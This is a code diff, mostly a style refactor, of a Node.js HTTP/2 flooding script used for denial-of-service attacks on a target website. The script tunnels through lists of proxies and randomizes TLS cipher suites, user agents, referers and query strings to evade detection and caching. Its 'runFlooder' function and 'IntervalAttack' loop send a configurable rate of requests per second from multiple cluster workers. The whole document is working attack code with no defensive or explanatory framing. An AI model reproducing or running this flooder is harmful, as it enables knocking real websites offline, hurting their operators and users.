@@ -6,7 +6,7 @@ import cluster from 'cluster';
 import crypto from 'crypto';
 import { URL } from 'url';
 import axios from 'axios';
-import cheerio from 'cheerio';
+import * as cheerio from 'cheerio'; // Fixed import
 import gradient from 'gradient-string';
 import { EventEmitter } from 'events';
 
@@ -20,6 +20,7 @@ if (process.argv.length < 7) {
 }
 
 const headers = {};
+
 function readLines(filePath) {
     return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
 }
@@ -66,64 +67,60 @@ const sig = [
     'rsa_pss_rsae_sha512',
     'rsa_pkcs1_sha256',
     'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512',
+    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
-    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
-    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
+    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 const accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 ];
-const lang_header = ['en-US,en;q=0.9'];
-
-const encoding_header = ['gzip, deflate, br'];
-
-const control_header = ['no-cache', 'max-age=0'];
-
+const lang_header = ["en-US,en;q=0.9"];
+const encoding_header = ["gzip, deflate, br"];
+const control_header = ["no-cache", "max-age=0"];
 const refers = [
-    'https://www.google.com/',
-    'https://www.facebook.com/',
-    'https://www.twitter.com/',
-    'https://www.youtube.com/',
-    'https://www.linkedin.com/',
+    "https://www.google.com/",
+    "https://www.facebook.com/",
+    "https://www.twitter.com/",
+    "https://www.youtube.com/",
+    "https://www.linkedin.com/"
 ];
-const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
-const ciphers1 =
-    'GREASE:' +
-    [
-        defaultCiphers[2],
-        defaultCiphers[1],
-        defaultCiphers[0],
-        ...defaultCiphers.slice(3),
-    ].join(':');
+
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers1 = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+].join(":");
 
 const uap = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"
 ];
 
-const cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
-const siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
-const uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
-const Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
-const accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
-const lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
-const encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
-const control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
-const proxies = readLines(args.proxyFile);
+let cipper = cplist[Math.floor(Math.random() * cplist.length)];
+let siga = sig[Math.floor(Math.random() * sig.length)];
+let uap1 = uap[Math.floor(Math.random() * uap.length)];
+let Ref = refers[Math.floor(Math.random() * refers.length)];
+let accept = accept_header[Math.floor(Math.random() * accept_header.length)];
+let lang = lang_header[Math.floor(Math.random() * lang_header.length)];
+let encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
+let control = control_header[Math.floor(Math.random() * control_header.length)];
+let proxies = readLines(args.proxyFile);
 const parsedTarget = new URL(args.target);
 
 if (cluster.isMaster) {
@@ -135,80 +132,81 @@ if (cluster.isMaster) {
 }
 
 class NetSocket {
-    constructor() {}
+    constructor() { }
 
     HTTP(options, callback) {
-        const parsedAddr = options.address.split(':');
+        const parsedAddr = options.address.split(":");
         const addrHost = parsedAddr[0];
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
         const buffer = Buffer.from(payload);
 
         const connection = net.connect({
             host: options.host,
-            port: options.port,
+            port: options.port
         });
 
         connection.setTimeout(options.timeout * 100000);
         connection.setKeepAlive(true, 100000);
 
-        connection.on('connect', () => {
+        connection.on("connect", () => {
             connection.write(buffer);
         });
 
-        connection.on('data', (chunk) => {
-            const response = chunk.toString('utf-8');
-            const isAlive = response.includes('HTTP/1.1 200');
-            if (!isAlive) {
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200");
+            if (isAlive === false) {
                 connection.destroy();
-                return callback(undefined, 'error: invalid response from proxy server');
+                return callback(undefined, "error: invalid response from proxy server");
             }
             return callback(connection, undefined);
         });
 
-        connection.on('timeout', () => {
+        connection.on("timeout", () => {
             connection.destroy();
-            return callback(undefined, 'error: timeout exceeded');
+            return callback(undefined, "error: timeout exceeded");
         });
 
-        connection.on('error', (error) => {
+        connection.on("error", error => {
             connection.destroy();
-            return callback(undefined, `error: ${error}`);
+            return callback(undefined, "error: " + error);
         });
     }
 }
 
 const Socker = new NetSocket();
-headers[':method'] = 'GET';
-headers[':authority'] = parsedTarget.host;
-headers[':path'] = `${parsedTarget.pathname}?${randstr(5)}=${randstr(25)}`;
-headers[':scheme'] = 'https';
-headers['x-forwarded-proto'] = 'https';
-headers['accept-language'] = lang;
-headers['accept-encoding'] = encoding;
-headers['cache-control'] = control;
-headers['sec-ch-ua'] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
-headers['sec-ch-ua-mobile'] = '?0';
-headers['sec-ch-ua-platform'] = 'Windows';
-headers['upgrade-insecure-requests'] = '1';
-headers['accept'] = accept;
-headers['user-agent'] = randstr(15);
-headers['sec-fetch-dest'] = 'document';
-headers['sec-fetch-mode'] = 'navigate';
-headers['sec-fetch-site'] = 'none';
-headers['TE'] = 'trailers';
-headers['sec-fetch-user'] = '?1';
-headers['x-requested-with'] = 'XMLHttpRequest';
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.pathname + "?" + randstr(5) + "=" + randstr(25);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["cache-control"] = control;
+headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = randstr(15);
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "none";
+headers["TE"] = "trailers";
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(':');
-    headers['referer'] = `https://${parsedTarget.host}/?${randstr(15)}`;
-    headers['origin'] = `https://${parsedTarget.host}`;
+    const parsedProxy = proxyAddr.split(":");
+
+    headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
+    headers["origin"] = "https://" + parsedTarget.host;
 
     const proxyOptions = {
         host: parsedProxy[0],
-        port: Number(parsedProxy[1]),
-        address: `${parsedTarget.host}:443`,
+        port: ~~parsedProxy[1],
+        address: parsedTarget.host + ":443",
         timeout: 100,
     };
 
@@ -224,25 +222,26 @@ function runFlooder() {
             ALPNProtocols: ['h2'],
             sigals: siga,
             socket: connection,
-            ciphers: tls.getCiphers().join(':') + cipper,
-            ecdhCurve: 'prime256v1:X25519',
+            ciphers: tls.getCiphers().join(":") + cipper,
+            ecdhCurve: "prime256v1:X25519",
             host: parsedTarget.host,
             rejectUnauthorized: false,
             servername: parsedTarget.host,
-            secureProtocol: 'TLS_method',
+            secureProtocol: "TLS_method",
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+
         tlsConn.setKeepAlive(true, 60000);
 
         const client = http2.connect(parsedTarget.href, {
-            protocol: 'https:',
+            protocol: "https:",
             settings: {
                 headerTableSize: 65536,
                 maxConcurrentStreams: 2000,
                 initialWindowSize: 65535,
                 maxHeaderListSize: 65536,
-                enablePush: false,
+                enablePush: false
             },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
@@ -255,24 +254,25 @@ function runFlooder() {
             maxConcurrentStreams: 2000,
             initialWindowSize: 6291456,
             maxHeaderListSize: 65536,
-            enablePush: false,
+            enablePush: false
         });
 
-        client.on('connect', () => {
+        client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(headers).on('response', (response) => {
-                        request.close();
-                        request.destroy();
-                        return;
-                    });
+                    const request = client.request(headers)
+                        .on("response", response => {
+                            request.close();
+                            request.destroy();
+                            return;
+                        });
 
                     request.end();
                 }
             }, 1000);
         });
 
-        client.on('close', () => {
+        client.on("close", () => {
             client.destroy();
             connection.destroy();
             return;
